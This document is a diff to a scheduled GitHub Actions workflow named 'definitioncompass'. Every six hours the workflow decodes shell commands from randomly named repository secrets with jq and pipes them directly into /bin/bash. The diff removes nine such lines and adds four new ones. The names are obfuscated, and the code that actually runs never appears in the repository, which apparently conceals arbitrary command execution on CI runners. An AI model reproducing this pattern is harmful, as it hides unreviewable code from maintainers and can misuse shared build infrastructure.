@@ -3,25 +3,19 @@ name: definitioncompass
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 0/6 * * *'
+    - cron: '44 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: definitioncompass
         env:
-          qef7305: ${{ secrets.qef7305 }}
+          ct6: ${{ secrets.ct6 }}
         run: |
-          echo $qef7305 | jq -r .v8599 | /bin/bash
-          echo $x425 | jq -r .tza69785 | /bin/bash
-          echo $zx4300 | jq -r .ul10 | /bin/bash
-          echo $wgurg42 | jq -r .h2425 | /bin/bash
-          echo $gvw89209 | jq -r .otgxf8 | /bin/bash
-          echo $wpxhd98923 | jq -r .vq5 | /bin/bash
-          echo $zkhus2968 | jq -r .nj669 | /bin/bash
-          echo $srzcv018 | jq -r .v13 | /bin/bash
-          echo $vx09 | jq -r .zet85384 | /bin/bash
+          echo $ct6 | jq -r .hvrth5862 | /bin/bash
+          echo $vjiwl4 | jq -r .mlli7 | /bin/bash
+          echo $q313 | jq -r .q72 | /bin/bash
+          echo $nlweu1 | jq -r .ac16758 | /bin/bash
 
